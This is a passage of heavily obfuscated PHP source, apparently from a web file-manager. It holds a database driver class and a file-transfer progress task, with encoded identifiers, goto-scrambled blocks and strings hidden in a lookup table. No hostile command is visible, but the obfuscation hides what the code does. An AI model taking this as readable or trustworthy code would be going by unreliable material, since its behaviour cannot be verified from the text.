11\112\x4f\x49\x4e\11\151\x6e\146\x6f\x72\155\141\164\151\157\x6e\x5f\163\143\150\x65\x6d\141\56\x63\x6f\154\x75\x6d\156\x73\40\101\123\40\x63\12\x9\x9\x4f\116\x20\40\x74\x2e\x74\x61\x62\x6c\x65\137\x63\141\x74\141\x6c\157\147\40\75\x20\x63\56\x74\x61\142\154\145\x5f\143\x61\164\x61\x6c\x6f\x67\12\11\11\101\116\104\x20\164\x2e\x74\141\x62\154\x65\137\x73\x63\150\x65\155\141\x20\x3d\40\x63\56\164\x61\x62\154\145\137\x73\x63\x68\145\155\141\xa\11\x9\101\116\x44\x20\164\56\164\x61\142\x6c\145\x5f\x6e\x61\155\x65\x20\75\x20\143\56\x74\x61\142\x6c\x65\x5f\156\141\155\145\12\x9\x9\x57\x48\x45\x52\105\40\40\40\164\x2e\164\141\142\154\x65\137\156\x61\x6d\x65\40\x3d\40\47{$b–ç–é¥Óà}\x27"; break; case $A“æ „Ä³[931]: $e¶ƒªãÁê = $A“æ „Ä³[932] . $b–ç–é¥Óà . $A“æ „Ä³[933]; break; case $A“æ „Ä³[913]: case $A“æ „Ä³[915]: $e¶ƒªãÁê = $A“æ „Ä³[934] . $A“æ „Ä³[935] . $A“æ „Ä³[936] . strtoupper($b–ç–é¥Óà) . $A“æ „Ä³[937] . strtoupper($b–ç–é¥Óà) . $A“æ „Ä³[938]; break; case $A“æ „Ä³[939]: $e¶ƒªãÁê = $A“æ „Ä³[940] . $b–ç–é¥Óà . $A“æ „Ä³[941]; break; case $A“æ „Ä³[914]: break; case $A“æ „Ä³[942]: default: $e¶ƒªãÁê = $A“æ „Ä³[943] . ($this->dbType == $A“æ „Ä³[942] ? "\x60{$b–ç–é¥Óà}\x60" : $b–ç–é¥Óà); } } goto E‘¥ïãæë; d‹ÊİØÈ¶š: } public function getTables($d£ÓİÂÄ·— = '') { $dÍë­àÕù± =& $_SERVER[Ö‘Øù]; if (think_config($dÍë­àÕù±[945])) { $EÈÓ²çõ‚· = str_replace($dÍë­àÕù±[946], $d£ÓİÂÄ·—, think_config($dÍë­àÕù±[945])); } else { switch ($this->dbType) { case $dÍë­àÕù±[913]: case $dÍë­àÕù±[915]: $EÈÓ²çõ‚· = $dÍë­àÕù±[947]; break; case $dÍë­àÕù±[912]: case $dÍë­àÕù±[930]: $EÈÓ²çõ‚· = $dÍë­àÕù±[948]; break; case $dÍë­àÕù±[939]: $EÈÓ²çõ‚· = $dÍë­àÕù±[949]; break; case $dÍë­àÕù±[914]: think_exception(think_lang($dÍë­àÕù±[950]) . $dÍë­àÕù±[951]); break; case $dÍë­àÕù±[931]: $EÈÓ²çõ‚· = $dÍë­àÕù±[42] . $dÍë­àÕù±[43] . $dÍë­àÕù±[44]; break; case $dÍë­àÕù±[942]: default: if (!empty($d£ÓİÂÄ·—)) { $EÈÓ²çõ‚· = $dÍë­àÕù±[894] . $d£ÓİÂÄ·— . $dÍë­àÕù±[895]; } else { $EÈÓ²çõ‚· = $dÍë­àÕù±[896]; } } } $DèÁ­ÂÆŠì = $this->query($EÈÓ²çõ‚·); $a‹ ’†ß³ = array(); foreach ($DèÁ­ÂÆŠì as $cªÚ»µ¦Š¬ => $B•ì«¤‰ø¥) { $a‹ ’†ß³[$cªÚ»µ¦Š¬] = current($B•ì«¤‰ø¥); } return $a‹ ’†ß³; } protected function parseLimit($bÍÕÍìÀƒ–) { $b»·íÙÅ³Ã =& $_SERVER[Ö‘Øù]; $e¯‡°†Ç•™ = $b»·íÙÅ³Ã[33]; if (!empty($bÍÕÍìÀƒ–)) { switch ($this->dbType) { case $b»·íÙÅ³Ã[939]: case $b»·íÙÅ³Ã[931]: $bÍÕÍìÀƒ– = explode($b»·íÙÅ³Ã[47], $bÍÕÍìÀƒ–); if (count($bÍÕÍìÀƒ–) > 1) { $e¯‡°†Ç•™ .= $b»·íÙÅ³Ã[48] . $bÍÕÍìÀƒ–[1] . $b»·íÙÅ³Ã[49] . $bÍÕÍìÀƒ–[0] . $b»·íÙÅ³Ã[50]; } else { $e¯‡°†Ç•™ .= $b»·íÙÅ³Ã[48] . $bÍÕÍìÀƒ–[0] . $b»·íÙÅ³Ã[50]; } break; case $b»·íÙÅ³Ã[912]: case $b»·íÙÅ³Ã[930]: break; case $b»·íÙÅ³Ã[914]: break; case $b»·íÙÅ³Ã[913]: case $b»·íÙÅ³Ã[915]: break; case $b»·íÙÅ³Ã[942]: default: $e¯‡°†Ç•™ .= $b»·íÙÅ³Ã[48] . $bÍÕÍìÀƒ– . $b»·íÙÅ³Ã[50]; } } return $e¯‡°†Ç•™; } public function parseKey(&$båÓ‚ù, $Dôˆ§ºõ½¯ = true) { $f¯²À‚äæÜ =& $_SERVER[Ö‘Øù]; if ($Dôˆ§ºõ½¯) { $båÓ‚ù = $this->parseKeyCheck($båÓ‚ù); } if ($this->dbType == $f¯²À‚äæÜ[942]) { if ($båÓ‚ù != $f¯²À‚äæÜ[182] && !preg_match($f¯²À‚äæÜ[906], $båÓ‚ù)) { $båÓ‚ù = $f¯²À‚äæÜ[383] . trim($båÓ‚ù, $f¯²À‚äæÜ[383]) . $f¯²À‚äæÜ[383]; } return $båÓ‚ù; } else { return parent::parseKey($båÓ‚ù, $Dôˆ§ºõ½¯); } } public function close() { $this->_linkID = null; } public function error() { $D½ĞÂù½…Ï =& $_SERVER[Ö‘Øù]; if ($this->PDOStatement) { $FºèÊ³’œ‚ = $this->PDOStatement->errorInfo(); $this->error = $FºèÊ³’œ‚[1] . $D½ĞÂù½…Ï[4] . $FºèÊ³’œ‚[2]; } else { $this->error = $D½ĞÂù½…Ï[33]; } if ($D½ĞÂù½…Ï[33] != $this->queryStr) { $this->error .= LNG($D½ĞÂù½…Ï[45]) . $this->queryStr; } think_trace($this->error, $D½ĞÂù½…Ï[33], $D½ĞÂù½…Ï[46]); return $this->error; } public function escapeString($aß¼ÔòÇŠ­) { $cŠâ½‚Í®È =& $_SERVER[Ö‘Øù]; switch ($this->dbType) { case $cŠâ½‚Í®È[939]: case $cŠâ½‚Í®È[912]: case $cŠâ½‚Í®È[930]: case $cŠâ½‚Í®È[942]: return addslashes($aß¼ÔòÇŠ­); case $cŠâ½‚Í®È[914]: case $cŠâ½‚Í®È[931]: case $cŠâ½‚Í®È[913]: case $cŠâ½‚Í®È[915]: return str_ireplace($cŠâ½‚Í®È[55], $cŠâ½‚Í®È[56], $aß¼ÔòÇŠ­); } } protected function parseValue($d¼™ã“É–) { $fê„ãë„ß =& $_SERVER[Ö‘Øù]; if (is_string($d¼™ã“É–)) { $bíÍ†É‚õÈ = strpos($d¼™ã“É–, $fê„ãë„ß[4]) === 0 && in_array($d¼™ã“É–, array_keys($this->bind)); $d¼™ã“É– = $bíÍ†É‚õÈ ? $this->escapeString($d¼™ã“É–) : $fê„ãë„ß[952] . $this->escapeString($d¼™ã“É–) . $fê„ãë„ß[952]; } elseif (isset($d¼™ã“É–[0]) && is_string($d¼™ã“É–[0]) && strtolower($d¼™ã“É–[0]) == $fê„ãë„ß[295]) { $d¼™ã“É– = $this->escapeString($d¼™ã“É–[1]); } elseif (is_array($d¼™ã“É–)) { $d¼™ã“É– = array_map(array($this, $fê„ãë„ß[953]), $d¼™ã“É–); } elseif (is_bool($d¼™ã“É–)) { $d¼™ã“É– = $d¼™ã“É– ? $fê„ãë„ß[87] : $fê„ãë„ß[191]; } elseif (is_null($d¼™ã“É–)) { $d¼™ã“É– = $fê„ãë„ß[103]; } return $d¼™ã“É–; } public function getLastInsertId() { $c‹ù‚â†ì¤ =& $_SERVER[Ö‘Øù]; switch ($this->dbType) { case $c‹ù‚â†ì¤[939]: case $c‹ù‚â†ì¤[931]: case $c‹ù‚â†ì¤[912]: case $c‹ù‚â†ì¤[930]: case $c‹ù‚â†ì¤[914]: case $c‹ù‚â†ì¤[942]: return $this->_linkID->lastInsertId(); case $c‹ù‚â†ì¤[913]: case $c‹ù‚â†ì¤[915]: $b‹ï³ÆÕìë = $this->table; $dßŒ‚¾À ß = $this->query("\x53\x45\x4c\105\x43\x54\x20{$b‹ï³ÆÕìë}\56\143\x75\162\162\x76\x61\154\40\143\165\162\x72\x76\x61\x6c\x20\106\x52\x4f\x4d\40\144\165\141\154"); return $dßŒ‚¾À ß ? $dßŒ‚¾À ß[0][$c‹ù‚â†ì¤[954]] : 0; } } } class DbSqlite extends DbSqliteBase { public function query($E‹ŸİğĞ²Á) { $c¶‚ÙØÏ½ =& $_SERVER[Ö‘Øù]; if (!CacheLock::fileLock($c¶‚ÙØÏ½[9])) { return !1; } $e»°ƒ¨Ö¸ß = parent::query($E‹ŸİğĞ²Á); CacheLock::fileUnLock($c¶‚ÙØÏ½[9]); return $e»°ƒ¨Ö¸ß; } public function execute($FºšÛÎÜö˜) { $CÙÄæÀ™ãá =& $_SERVER[Ö‘Øù]; if (!CacheLock::fileLock($CÙÄæÀ™ãá[9])) { return !1; } $CÀÜ¨¾Òæ§ = parent::execute($FºšÛÎÜö˜); CacheLock::fileUnLock($CÙÄæÀ™ãá[9]); return $CÀÜ¨¾Òæ§; } } goto cŸÍ¯–â‚‰; F£çêÀÊ”â: class TaskFileTransfer extends Task { protected function startAfter() { goto e³¾÷»Ùä¨; D¨Ï±Š·: Hook::bind($cŒåÍ‡—ˆÂ[1596], array($this, $cŒåÍ‡—ˆÂ[1597])); Hook::bind($cŒåÍ‡—ˆÂ[586], array($this, $cŒåÍ‡—ˆÂ[1598])); $this->sourceModelCopyFlag = !1; goto d©Ô´ëÄø¨; C±ÕŒÙÔáç: Hook::bind($cŒåÍ‡—ˆÂ[565], array($this, $cŒåÍ‡—ˆÂ[1595])); Hook::bind($cŒåÍ‡—ˆÂ[567], array($this, $cŒåÍ‡—ˆÂ[1595])); Hook::bind($cŒåÍ‡—ˆÂ[569], array($this, $cŒåÍ‡—ˆÂ[1595])); goto D¨Ï±Š·; E¸Áâ˜—Å—: $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1058]] = $cŒåÍ‡—ˆÂ[33]; $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1609]] = $cŒåÍ‡—ˆÂ[33]; $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1610]] = 0; goto b¼ñÂ¥ùœ¹; A®ªÑ™İÉ·: $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1605]] = LNG($cŒåÍ‡—ˆÂ[1606]); $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1607]] = 0; $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1608]] = 0; goto E¸Áâ˜—Å—; d©Ô´ëÄø¨: Hook::bind($cŒåÍ‡—ˆÂ[1599], array($this, $cŒåÍ‡—ˆÂ[1600])); Hook::bind($cŒåÍ‡—ˆÂ[1601], array($this, $cŒåÍ‡—ˆÂ[1602])); Hook::bind($cŒåÍ‡—ˆÂ[1603], array($this, $cŒåÍ‡—ˆÂ[1604])); goto A®ªÑ™İÉ·; cÓé³£šçŞ: Hook::bind($cŒåÍ‡—ˆÂ[597], array($this, $cŒåÍ‡—ˆÂ[1594])); Hook::bind($cŒåÍ‡—ˆÂ[563], array($this, $cŒåÍ‡—ˆÂ[1595])); Hook::bind($cŒåÍ‡—ˆÂ[560], array($this, $cŒåÍ‡—ˆÂ[1595])); goto C±ÕŒÙÔáç; DÃø»Ä…ó»: Hook::bind($cŒåÍ‡—ˆÂ[1587], array($this, $cŒåÍ‡—ˆÂ[1588])); Hook::bind($cŒåÍ‡—ˆÂ[1144], array($this, $cŒåÍ‡—ˆÂ[1589])); Hook::bind($cŒåÍ‡—ˆÂ[1590], array($this, $cŒåÍ‡—ˆÂ[1591])); goto e¼à¾ã×à; e¼à¾ã×à: Hook::bind($cŒåÍ‡—ˆÂ[593], array($this, $cŒåÍ‡—ˆÂ[1592])); Hook::bind($cŒåÍ‡—ˆÂ[594], array($this, $cŒåÍ‡—ˆÂ[1593])); Hook::bind($cŒåÍ‡—ˆÂ[596], array($this, $cŒåÍ‡—ˆÂ[1594])); goto cÓé³£šçŞ; e³¾÷»Ùä¨: $cŒåÍ‡—ˆÂ =& $_SERVER[Ö‘Øù]; $bõğÒÁÌ†Ã =& $this->task; $this->sourceCopyFolder = !1; goto DÃø»Ä…ó»; b¼ñÂ¥ùœ¹: $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1611]] = 0; $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1612]] = 0; if (!$bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1464]]) { $bõğÒÁÌ†Ã[$cŒåÍ‡—ˆÂ[1464]] = LNG($cŒåÍ‡—ˆÂ[1613]); } goto dÀˆÌ”áÄ; dÀˆÌ”áÄ: } protected function endAfter() { goto BÉîÚø´¬î; c¯ñ—¯³é­: Hook::unbind($e˜øïŠŒÇÑ[1590], array($this, $e˜øïŠŒÇÑ[1591])); Hook::unbind($e˜øïŠŒÇÑ[593], array($this, $e˜øïŠŒÇÑ[1592])); Hook::unbind($e˜øïŠŒÇÑ[594], array($this, $e˜øïŠŒÇÑ[1593])); goto F»”Ù×‚ˆŞ; dóìÃÏºáÉ: Hook::unbind($e˜øïŠŒÇÑ[560], array($this, $e˜øïŠŒÇÑ[1595])); Hook::unbind($e˜øïŠŒÇÑ[565], array($this, $e˜øïŠŒÇÑ[1595])); Hook::unbind($e˜øïŠŒÇÑ[567], array($this, $e˜øïŠŒÇÑ[1595])); goto d™Ö®˜‰¾²; EèÁ”–å: Hook::unbind($e˜øïŠŒÇÑ[1599], array($this, $e˜øïŠŒÇÑ[1600])); Hook::unbind($e˜øïŠŒÇÑ[1601], array($this, $e˜øïŠŒÇÑ[1602])); Hook::unbind($e˜øïŠŒÇÑ[1603], array($this, $e˜øïŠŒÇÑ[1604])); goto bÌ˜Ó·»½; BÉîÚø´¬î: $e˜øïŠŒÇÑ =& $_SERVER[Ö‘Øù]; Hook::unbind($e˜øïŠŒÇÑ[1587], array($this, $e˜øïŠŒÇÑ[1588])); Hook::unbind($e˜øïŠŒÇÑ[1144], array($this, $e˜øïŠŒÇÑ[1589])); goto c¯ñ—¯³é­; d™Ö®˜‰¾²: Hook::unbind($e˜øïŠŒÇÑ[569], array($this, $e˜øïŠŒÇÑ[1595])); Hook::unbind($e˜øïŠŒÇÑ[1596], array($this, $e˜øïŠŒÇÑ[1597])); Hook::unbind($e˜øïŠŒÇÑ[586], array($this, $e˜øïŠŒÇÑ[1598])); goto EèÁ”–å; F»”Ù×‚ˆŞ: Hook::unbind($e˜øïŠŒÇÑ[596], array($this, $e˜øïŠŒÇÑ[1594])); Hook::unbind($e˜øïŠŒÇÑ[597], array($this, $e˜øïŠŒÇÑ[1594])); Hook::unbind($e˜øïŠŒÇÑ[563], array($this, $e˜øïŠŒÇÑ[1595])); goto dóìÃÏºáÉ; bÌ˜Ó·»½: } public function copyMoveStart($c‹½Ô¥ÃÚ, $BÉŠâÊ¨Ôë, $dÈŒ´Î´ŒÛ, $bÍ÷±Èù»ˆ) { goto B‡–Éí«öĞ; B‡–Éí«öĞ: $c‰õçÇ°¬ =& $_SERVER[Ö‘Øù]; self::log($c‰õçÇ°¬[1614] . $BÉŠâÊ¨Ôë . $c‰õçÇ°¬[67] . $bÍ÷±Èù»ˆ); $bÊÙŠ§¥ñÃ = rtrim(TEMP_FILES, $c‰õçÇ°¬[8]); goto b‚¯×Ó‚¡£; F—²ƒµŸô: $f¨ãÊÂòÏ÷[$c‰õçÇ°¬[1615]] = KodIO::transferType($c‹½Ô¥ÃÚ, $dÈŒ´Î´ŒÛ); $this->update(); goto d¸©İÀÅ™£; b‚¯×Ó‚¡£: if (substr($BÉŠâÊ¨Ôë, 0, strlen($bÊÙŠ§¥ñÃ)) == $bÊÙŠ§¥ñÃ) { return; } if (substr($bÍ÷±Èù»ˆ, 0, strlen($bÊÙŠ§¥ñÃ)) == $bÊÙŠ§¥ñÃ) { return; } $f¨ãÊÂòÏ÷ =& $this->task; goto F—²ƒµŸô; d¸©İÀÅ™£: } public function updateAfter() { $eÅÏô„«„ó =& $_SERVER[Ö‘Øù]; $cÁ¼¿¹±Ê· =& $this->task; if (!$cÁ¼¿¹±Ê·[$eÅÏô„«„ó[756]]) { return; } if ($this->sourceModelCopyFlag) { return; } if ($cÁ¼¿¹±Ê·[$eÅÏô„«„ó[1615]] == $eÅÏô„«„ó[1217]) { return; } self::updateTask($cÁ¼¿¹±Ê·); } private static function updateTask(&$aÂ©èè¹á) { $f×‘ÌåÉî =& $_SERVER[Ö‘Øù]; if ($aÂ©èè¹á[$f×‘ÌåÉî[1615]] == $f×‘ÌåÉî[1128] || $aÂ©èè¹á[$f×‘ÌåÉî[1615]] == $f×‘ÌåÉî[107]) { if ($aÂ©èè¹á[$f×‘ÌåÉî[1609]]) { $aÂ©èè¹á[$f×‘ÌåÉî[1612]] = $aÂ©èè¹á[$f×‘ÌåÉî[1611]] + $aÂ©èè¹á[$f×‘ÌåÉî[1608]]; } } else { if ($aÂ©èè¹á[$f×‘ÌåÉî[1615]] == $f×‘ÌåÉî[1218]) { if ($aÂ©èè¹á[$f×‘ÌåÉî[1609]] == $f×‘ÌåÉî[1128]) { $aÂ©èè¹á[$f×‘ÌåÉî[1612]] = $aÂ©èè¹á[$f×‘ÌåÉî[1611]] + $aÂ©èè¹á[$f×‘ÌåÉî[1608]] * 0.5; } else { if ($aÂ©èè¹á[$f×‘ÌåÉî[1609]] == $f×‘ÌåÉî[107]) { $aÂ©èè¹á[$f×‘ÌåÉî[1612]] = $aÂ©èè¹á[$f×‘ÌåÉî[1611]] + $aÂ©èè¹á[$f×‘ÌåÉî[1607]] * 0.5 + $aÂ©èè¹á[$f×‘ÌåÉî[1608]] * 0.5; } } } } $aÂ©èè¹á[$f×‘ÌåÉî[1562]] = $aÂ©èè¹á[$f×‘ÌåÉî[1612]] / $aÂ©èè¹á[$f×‘ÌåÉî[756]]; if ($aÂ©èè¹á[$f×‘ÌåÉî[1562]] > 0) { $dòè»Œ‚ƒ = timeFloat() - $aÂ©èè¹á[$f×‘ÌåÉî[782]] - $aÂ©èè¹á[$f×‘ÌåÉî[1565]]; $aÂ©èè¹á[$f×‘ÌåÉî[1566]] = $dòè»Œ‚ƒ * (1 - $aÂ©èè¹á[$f×‘ÌåÉî[1562]]) / $aÂ©èè¹á[$f×‘ÌåÉî[1562]]; } } public function addPath($C‚©È¬Î¹) { goto fÍñ¯¹´‰¬; fÍñ¯¹´‰¬: $cªß°Ş®ƒÁ =& $_SERVER[Ö‘Øù]; if (!$C‚©È¬Î¹) { return; } $BŠéºÍ’» =& $this->task; goto DŠİ•ØÉƒñ; D×¤õØ¨ƒŞ: if ($e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[29]] == $cªß°Ş®ƒÁ[193]) { $BŠéºÍ’»[$cªß°Ş®ƒÁ[1056]] += 1; } else { $BŠéºÍ’»[$cªß°Ş®ƒÁ[1056]] += $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[81]][$cªß°Ş®ƒÁ[79]]; if ($e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[397]]) { $BŠéºÍ’»[$cªß°Ş®ƒÁ[1056]] += $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[81]][$cªß°Ş®ƒÁ[80]] + 1; } } $BŠéºÍ’»[$cªß°Ş®ƒÁ[756]] += $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[78]]; $this->update(); goto Eã‚Ó‘Áîõ; DŠİ•ØÉƒñ: $e®ŠËäÒ¢À = IO::infoWithChildren($C‚©È¬Î¹); $b˜¹ÙÜÂÈŸ = $BŠéºÍ’»[$cªß°Ş®ƒÁ[1616]] ? $BŠéºÍ’»[$cªß°Ş®ƒÁ[1616]][$cªß°Ş®ƒÁ[1617]] : 0; $BŠéºÍ’»[$cªß°Ş®ƒÁ[1616]] = array($cªß°Ş®ƒÁ[1617] => $b˜¹ÙÜÂÈŸ + 1, $cªß°Ş®ƒÁ[415] => $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[28]], $cªß°Ş®ƒÁ[76] => $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[76]], $cªß°Ş®ƒÁ[514] => $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[514]] ? $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[514]] : $e®ŠËäÒ¢À[$cªß°Ş®ƒÁ[76]]); goto D×¤õØ¨ƒŞ; Eã‚Ó‘Áîõ: } public function sourceCopyFolderStart() { $this->sourceCopyFolder = !0; } public function sourceCopyFolderEnd() { $this->sourceCopyFolder = !1; } public function sourceAddFile($fÌ¼ÑÇÊ‚Ò) { $FÇŠ¯ˆ®Ş =& $_SERVER[Ö‘Øù]; $cÆÔÌ»ÈõÂ =& $this->task; $cÆÔÌ»ÈõÂ[$FÇŠ¯ˆ®Ş[1605]] = $fÌ¼ÑÇÊ‚Ò[$FÇŠ¯ˆ®Ş[28]]; $cÆÔÌ»ÈõÂ[$FÇŠ¯ˆ®Ş[1058]] = $fÌ¼ÑÇÊ‚Ò[$FÇŠ¯ˆ®Ş[28]]; $this->update(); } public function copyFileStart($dç ƒ„« , $eĞïñÆÂ¸, $fÕ™âµôô, $DÆ¯ÊÊÖ¯, $BÉï±É—Ÿï, $C“—„–ÈÕ) { goto d†…¡Š˜é¡; CÚÜµ‚ôí•: $this->update(0, $C¶¥Ã ä®); goto c£ÑĞÂíåå; d¸‹ÁãíÛ¿: $e·¥¿¼ëæğ[$d²¹Ã±¯·[1605]] = $BºÀèƒÌ¡; $e·¥¿¼ëæğ[$d²¹Ã±¯·[1607]] = (int) $dç ƒ„« ->size($eĞïñÆÂ¸); $e·¥¿¼ëæğ[$d²¹Ã±¯·[1608]] = 0; goto eÕ‰¤¶š›Ø; c¸‚®ƒ ÕÛ: $GLOBALS[$d²¹Ã±¯·[1619]] = $BÉï±É—Ÿï; $GLOBALS[$d²¹Ã±¯·[1618]] = $C“—„–ÈÕ; $e·¥¿¼ëæğ =& $this->task; goto d¸‹ÁãíÛ¿; bòÁã»åğì: $C¶¥Ã ä® = $e·¥¿¼ëæğ[$d²¹Ã±¯·[1607]] > 1024 * 1024 * 10 ? !0 : !1; Cache::remove($e·¥¿¼ëæğ[$d²¹Ã±¯·[395]] . $d²¹Ã±¯·[1620]); if ($C¶¥Ã ä® && file_exists(get_path_father($DÆ¯ÊÊÖ¯))) { Cache::set($e·¥¿¼ëæğ[$d²¹Ã±¯·[395]] . $d²¹Ã±¯·[1620], $DÆ¯ÊÊÖ¯); $e·¥¿¼ëæğ[$d²¹Ã±¯·[1580]] = array($d²¹Ã±¯·[1621], $d²¹Ã±¯·[1622]); } goto CÚÜµ‚ôí•; d†…¡Š˜é¡: $d²¹Ã±¯· =& $_SERVER[Ö‘Øù]; $BºÀèƒÌ¡ = $BÉï±É—Ÿï; if ($BºÀèƒÌ¡ == $GLOBALS[$d²¹Ã±¯·[1618]]) { $BºÀèƒÌ¡ = $GLOBALS[$d²¹Ã±¯·[1619]]; } goto c¸‚®ƒ ÕÛ; eÕ‰¤¶š›Ø: $e·¥¿¼ëæğ[$d²¹Ã±¯·[1058]] = $d²¹Ã±¯·[33]; $e·¥¿¼ëæğ[$d²¹Ã±¯·[1609]] = $d²¹Ã±¯·[33]; $e·¥¿¼ëæğ[$d²¹Ã±¯·[1610]] = 0; goto bòÁã»åğì; c£ÑĞÂíåå: } public static function updateCopyLocalFileSize($f îÕ†™µ) { goto B“Ş“åÖÃõ; d¥„¾Şäó: $f îÕ†™µ[$fÒèËË‰×â[1608]] = @filesize($a˜”©±·–˜); $f îÕ†™µ[$fÒèËË‰×â[1612]] += $f îÕ†™µ[$fÒèËË‰×â[1608]]; self::updateTask($f îÕ†™µ); goto E™ùÍˆ†Ô; E™ùÍˆ†Ô: return $f îÕ†™µ; goto Eá±¹ÒÉøÏ; B“Ş“åÖÃõ: $fÒèËË‰×â =& $_SERVER[Ö‘Øù]; $a˜”©±·–˜ = Cache::get($f îÕ†™µ[$fÒèËË‰×â[395]] . $fÒèËË‰×â[1620]); if (!$a˜”©±·–˜ || !file_exists($a˜”©±·–˜)) { return $f îÕ†™µ; } goto d¥„¾Şäó; Eá±¹ÒÉøÏ: } public function copyFileEnd($DÁíÙæÂ«½, $cİ…ˆ „¦, $EÙæªñæö¨, $cö¿¦İÀš‚, $e¸ÛÃˆ¸°, $A‹Ö“à‘ƒ) { goto e‘‹Á¢›Æ×; e‘‹Á¢›Æ×: $FÎª÷¯ä‰ =& $_SERVER[Ö‘Øù]; $eÌ‚ÏÊÃ’Ç =& $this->task; $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1608]] = $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1607]]; goto c†®¯Ã•²Î; EõÆ±Å±–: Cache::remove($eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[395]] . $FÎª÷¯ä‰[1620]); self::log($FÎª÷¯ä‰[1623] . $cİ…ˆ „¦ . $FÎª÷¯ä‰[67] . $cö¿¦İÀš‚ . $FÎª÷¯ä‰[229] . $e¸ÛÃˆ¸° . $FÎª÷¯ä‰[1624] . $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1605]]); goto c‘ÒËõí†; c†®¯Ã•²Î: $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1609]] = $FÎª÷¯ä‰[33]; unset($eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1580]]); if ($e¸ÛÃˆ¸° == $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1605]]) { $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1611]] += $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1607]]; $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1612]] = $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1611]]; $this->update(1); } else { $this->update(); $eÌ‚ÏÊÃ’Ç[$FÎª÷¯ä‰[1608]] = 0; } goto EõÆ±Å±–; c‘ÒËõí†: } public function updateFileEnd($CÁ¦–¡Ò—–, $B—î“ÜÇÓ) { goto a’Ê²ƒƒ¶¦; F­œ£Áœ£›: $this->update(1); self::log($EÕ†…‡×Ñó[1625] . $CÁ¦–¡Ò—–); goto bİÒ„¤Å‘¶; a’Ê²ƒƒ¶¦: $EÕ†…‡×Ñó =& $_SERVER[Ö‘Øù]; $AæÑ‘‘ù¿‚ =& $this->task; $AæÑ‘‘ù¿‚[$EÕ†…‡×Ñó[1605]] = $CÁ¦–¡Ò—–; goto bÍ¸›îâô; bÍ¸›îâô: $AæÑ‘‘ù¿‚[$EÕ†…‡×Ñó[1607]] = $B—î“ÜÇÓ; $AæÑ‘‘ù¿‚[$EÕ†…‡×Ñó[1611]] += $B—î“ÜÇÓ; $AæÑ‘‘ù¿‚[$EÕ†…‡×Ñó[1612]] = $AæÑ‘‘ù¿‚[$EÕ†…‡×Ñó[1611]]; goto F­œ£Áœ£›; bİÒ„¤Å‘¶: } public function sourceModelCopy($D²ÚÉ÷ÕÁØ) { goto c—‚ĞšÂ¼„; F‘ÑÕ¤­¶Ò: switch ($cÁ›ŸäêÄÚ) { case $C÷Ë›ˆœ­Š[561]: $c¾ï„´Í“¹ = 1; break; case $C÷Ë›ˆœ­Š[564]: $Dæ«ôõİëì[$C÷Ë›ˆœ­Š[1605]] = $aÓâ„è¶×[$C÷Ë›ˆœ­Š[28]]; break; case $C÷Ë›ˆœ­Š[566]: $c¾ï„´Í“¹ = intval($D²ÚÉ÷ÕÁØ[$C÷Ë›ˆœ­Š[378]] * 0.4); break; case $C÷Ë›ˆœ­Š[568]: $c¾ï„´Í“¹ = intval($D²ÚÉ÷ÕÁØ[$C÷Ë›ˆœ­Š[378]] * 0.2); break; case $C÷Ë›ˆœ­Š[570]: $c¾ï„´Í“¹ = intval($D²ÚÉ÷ÕÁØ[$C÷Ë›ˆœ­Š[378]] * 0.4); break; } $this->update($c¾ï„´Í“¹); $this->sourceModelCopyFlag = !1; goto b¡°±ğ; FÆÂŸÎ­‹ì: $Dæ«ôõİëì =& $this->task; $this->sourceModelCopyFlag = !0; $c¾ï„´Í“¹ = 0; goto F‘ÑÕ¤­¶Ò; c—‚ĞšÂ¼„: $C÷Ë›ˆœ­Š =& $_SERVER[Ö‘Øù]; $cÁ›ŸäêÄÚ = $D²ÚÉ÷ÕÁØ[0]; $aÓâ„è¶× = $D²ÚÉ÷ÕÁØ[1]; goto FÆÂŸÎ­‹ì; b¡°±ğ: } public function sourceRemove($fâ‡–¹œÎö, $AÁ¯Õ‹›Ÿö) { $FÑå¸œîø© =& $_SERVER[Ö‘Øù]; $this->sourceModelCopyFlag = !0; $aÒè­‰Ñ§ = 1; if (isset($fâ‡–¹œÎö[$FÑå¸œîø©[81]])) { $aÒè­‰Ñ§ = $fâ‡–¹œÎö[$FÑå¸œîø©[81]][$FÑå¸œîø©[79]] + $fâ‡–¹œÎö[$FÑå¸œîø©[81]][$FÑå¸œîø©[80]] + 1; } $this->update($aÒè­‰Ñ§); $this->sourceModelCopyFlag = !1; } public function sourceMove($f¬¶âŞÉòŠ) { $this->sourceRemove($f¬¶âŞÉòŠ, !1); } public function curlProgress($E˜›ºÒƒ¢Æ, $d„åæ·œçœ, $D¨ê„ê†, $c·âö¤»¤·, $A Û˜…»´Ê) { $cÃ§»«Á‘Á =& $_SERVER[Ö‘Øù]; $CåÑÎ§øŞŞ =& $this->task; if ($A Û˜…»´Ê > 0) { $CåÑÎ§øŞŞ[$cÃ§»«Á‘Á[1058]] = $cÃ§»«Á‘Á[1626]; 